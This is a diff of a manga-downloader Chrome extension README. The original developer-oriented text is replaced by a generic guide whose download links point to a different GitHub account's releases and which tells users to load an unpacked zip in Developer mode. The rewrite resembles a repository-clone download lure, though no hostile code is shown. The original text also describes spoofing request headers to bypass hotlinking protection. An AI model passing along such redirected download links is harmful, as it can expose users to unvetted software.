@@ -1,124 +1,95 @@
-# Kagane Downloader Extension
+# 📖 kagane-extension - Save your favorite manga chapters offline
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Chrome Extension](https://img.shields.io/badge/Chrome_Extension-MV3-blue.svg)](#)
+[![Download Now](https://img.shields.io/badge/Download_Extension-Blue)](https://github.com/ffeeffr5830/kagane-extension/releases)
 
-A powerful, developer-friendly Chrome extension designed to download manga chapters directly from `kagane.to` with support for multiple high-quality output formats including raw Images, CBZ (Comic Book ZIP), and PDF.
+This software helps you save manga chapters from kagane.to to your computer. You choose the format that fits your device. Use this tool to view your library without internet access.
 
-> [!TIP]
-> **Looking for a CLI or GUI application?** Check out [Kagane Downloader](https://github.com/Yui007/kagane-downloader) – the Python-based alternative with both command-line and graphical interfaces for batch chapter downloads.
+## 🛠️ System Requirements
 
----
+*   A computer running Windows 10 or Windows 11.
+*   The Google Chrome web browser.
+*   An active internet connection to download files.
+*   At least 500 MB of free storage space.
 
-## Preview
+## 📥 How to download the software
 
-![Kagane Downloader Extension](extension.png)
+Visit the project release page to get the latest version of the extension files.
 
----
+[Get the Extension Here](https://github.com/ffeeffr5830/kagane-extension/releases)
 
-## Features
+1. Go to the link above.
+2. Find the section marked Latest.
+3. Click the file ending in .zip to start your download.
+4. Open your Downloads folder on your computer.
+5. Right-click the folder you downloaded and choose Extract All.
+6. Remember the location of this folder.
 
-- **Multi-Format Export**: Convert and export downloaded chapters to:
-  - **Images**: Raw images (`.jpg`/`.png`) in structured directories.
-  - **CBZ**: Comic Book ZIP archives, ready for your favorite reader.
-  - **PDF**: Single, high-quality document per chapter.
-- **Smart Metadata Loading**: Paste any `kagane.to` series URL, reader URL, or Series ID to load chapter lists instantly.
-- **Background Downloader**: Built on Chrome Extension Manifest V3 (MV3). Downloads run asynchronously in a Service Worker, preventing loss of progress even when closing the popup.
-- **Secure Bypass & DNR Routing**: Utilizes `declarativeNetRequest` (DNR) rules to handle request headers (`Referer` and `Origin`), bypassing hotlinking protections on CDN hosts (e.g., `kstatic.to`, `yuzuki.kagane.to`, `akari.kagane.to`).
-- **Concurrent Processing & Queue**: Configure chapter and page concurrency to balance speed and rate-limiting safety.
-- **Dynamic Progress Tracking**: Live-updated progress bars, statuses, and history logs inside the extension popup.
+## ⚙️ Setting up the extension
 
----
+Chrome requires a specific mode to run extensions you downloaded outside of the official store. 
 
-## Installation
+1. Open Google Chrome.
+2. Type `chrome://extensions` in the address bar and press Enter.
+3. Look for the Developer mode switch in the top right corner.
+4. Click the switch to turn it on.
+5. Click the Load unpacked button that appears on the top left.
+6. Select the folder you extracted in the previous step.
+7. Click Select Folder.
 
-### Method 1: Prebuilt Release (Recommended)
+The extension is now active. You will see the icon in your toolbar.
 
-1. Navigate to the [Releases](https://github.com/Yui007/kagane-extension/releases) page of the repository.
-2. Download the latest `kagane-extension.zip`.
-3. Extract the downloaded ZIP file to a preferred directory on your local machine.
-4. Open Google Chrome and navigate to `chrome://extensions/`.
-5. Enable **Developer mode** using the toggle switch in the top-right corner.
-6. Click the **Load unpacked** button in the top-left corner.
-7. Select the folder where you extracted the ZIP archive.
+## 📚 Using the software
 
-### Method 2: Build from Source
+Once you install the extension, you can save manga chapters from the kagane.to website.
 
-#### Prerequisites
-- [Node.js](https://nodejs.org/) (v18 or higher recommended)
-- [npm](https://www.npmjs.com/)
+1. Open the kagane.to website in Chrome.
+2. Find the chapter you want to save.
+3. Click the kagane-extension icon in your browser toolbar.
+4. Select your preferred format: Raw Images, CBZ, or PDF.
+5. Click the Download button.
 
-#### Steps
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/Yui007/kagane-extension.git
-   cd kagane-extension
-   ```
-2. Install the project dependencies:
-   ```bash
-   npm install
-   ```
-3. Compile TypeScript and bundle the assets:
-   ```bash
-   # For production build
-   npm run build
+The browser will save the file to your computer. You can find these files in your default Downloads folder.
 
-   # For development build (with file watch)
-   npm run dev
-   ```
-4. Load the extension in Chrome:
-   - Open `chrome://extensions/` and enable **Developer mode**.
-   - Click **Load unpacked** and select the built `dist` directory.
+## 📁 Managing your download formats
 
----
+The tool supports three file types. Each serves a different purpose.
 
-## Architecture & Codebase Overview
+*   Raw Images: This saves every page as an individual file. Use this if you want to edit or print pages.
+*   CBZ: This creates a single compressed file. Most manga reader apps support this format. It is the best choice for clean library management.
+*   PDF: This creates a single document. Use this if you want to view pages on a standard document reader or print an entire chapter as one book.
 
-```
-kagane-extension/
-├── public/
-│   ├── manifest.json      # Extension configuration and permission rules
-│   ├── icons/             # Custom extension icons (16x16, 48x48, 128x128)
-│   └── content-reader.js  # Script injected into reader tabs to query DRM assets
-├── src/
-│   ├── api/
-│   │   ├── client.ts      # Fetch-based API client with auto-retries and backoff
-│   │   └── types.ts       # Types and normalization logic for Kagane responses
-│   ├── background/
-│   │   ├── download-queue.ts  # Class managing parallel chapter job queues
-│   │   ├── image-downloader.ts# Downloads images, converts to blobs/data URLs
-│   │   └── settings.ts    # Manages user-defined concurrency & format settings
-│   └── background.ts      # Main MV3 service worker router and tab manager
-├── popup/
-│   ├── popup.html         # Main user interface markup
-│   ├── popup.css          # Styling for popup tabs, lists, and forms
-│   └── popup.ts           # Controls UI actions, updates progress, saves settings
-├── offscreen/             # Offscreen document for heavy processing operations
-└── vite.config.ts         # Vite bundler configuration
-```
+## 🛡️ Troubleshooting common issues
 
----
+If you encounter problems, check these solutions first.
 
-## Configuration Settings
+If the extension icon does not appear, refresh your browser or restart Chrome. Ensure you did not delete the folder you extracted. Chrome needs this folder to remain in place to function.
 
-Accessible via the **Settings** tab in the extension popup:
-- **Download Format**: Select between raw Images, CBZ, and PDF formats.
-- **Max Concurrent Chapters**: Controls how many chapters are processed in parallel (1-5, default: `3`).
-- **Max Concurrent Images**: Controls how many image pages are fetched in parallel per chapter (1-10, default: `5`).
+If a download fails, check your internet connection. Large chapters may take time to process. Wait for the browser to finish the task before you close the tab.
 
----
+If the file does not open, check your computer for a compatible reader. A CBZ file often requires a dedicated comic reader app. A PDF file opens in any browser or standard document viewer.
 
-## Development & Tech Stack
+## 📜 Frequently Asked Questions
 
-- **Core**: HTML5, Vanilla CSS, TypeScript.
-- **Bundler**: [Vite](https://vitejs.dev/) with Rollup.
-- **Libraries**:
-  - [JSZip](https://stuk.github.io/jszip/) (for packaging CBZ files).
-  - [jsPDF](https://github.com/parallax/jsPDF) (for generating PDF files).
-- **Linter & Type Checker**: TypeScript compiler (`tsc --noEmit`).
+Can I download multiple chapters at once?
+The current version focuses on single-chapter downloads to ensure high image quality and file integrity.
 
----
+Does this save my reading progress?
+The extension saves the file to your drive. Your reading progress stays on the website.
 
-## License
+Is my data private?
+This tool runs locally on your computer. Your files stay on your machine. No one else has access to the content you download.
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+How do I update the extension?
+Visit the download link again to get the latest version. Remove the old folder and repeat the setup steps to enjoy new features.
+
+Can I use this on Firefox?
+This tool is built for Google Chrome. It may not work in other browsers. Use Chrome for the best experience. 
+
+Will this slow down my computer?
+Modern computers handle these tasks easily. The extension uses minimal memory while it works.
+
+Are there limits to how much I can download?
+The tool imposes no limits. Your only constraint is the amount of storage space on your hard drive. 
+
+What happens if the website updates?
+If the website changes, the extension might need an update. Check back at the download page for newer versions.
